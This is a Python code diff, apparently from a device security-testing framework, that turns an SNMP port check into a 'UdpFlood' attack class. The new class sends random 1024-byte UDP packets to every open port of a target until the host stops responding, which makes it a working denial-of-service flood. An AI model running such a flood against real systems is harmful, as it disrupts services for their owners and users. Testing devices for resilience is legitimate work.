@@ -1,4 +1,3 @@
-
 from generic_attack import *
 import logging
 log = logging.getLogger(__name__)
@@ -7,10 +6,11 @@ from re import search
 from subprocess import Popen
 from commands import getoutput
 
-class Ssnp(GenericAttack):
+
+class UdpFlood(GenericAttack):
 
     def __init__(self, attackName, attackConfig, deviceConfig):
-        super(Ssnp, self).__init__(attackName, attackConfig, deviceConfig)
+        super(UdpFlood, self).__init__(attackName, attackConfig, deviceConfig)
 
     def initialize(self, result):
         self.running = True
@@ -23,11 +23,22 @@ class Ssnp(GenericAttack):
         elif self.device["vulnerable_ports"]["udp"]["open"] is None:
             return {"status": "no_open_ports"}
 
-        openPorts = self.device["vulnerable_ports"]["udp"]["open"]
-        if 161 in openPorts:
-            return {"status": "vulnerable to ssnp"}
+        """ Send packets
+                """
+        # Creates a socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-        return {"status": "no_open_ports"}
+        # Creates packet
+        bytes = random._urandom(1024)
+
+        while self.running:
+            for port in self.device["vulnerable_ports"]["udp"]["open"]:
+                sock.sendto(bytes, (target, port))
+            if not self.is_alive():
+                log.info('Host not responding!')
+                return {"status": "not_responding"}
+
+        return {"status": "responding"}
 
     def is_alive(self):
         """Check if the target is alive"""
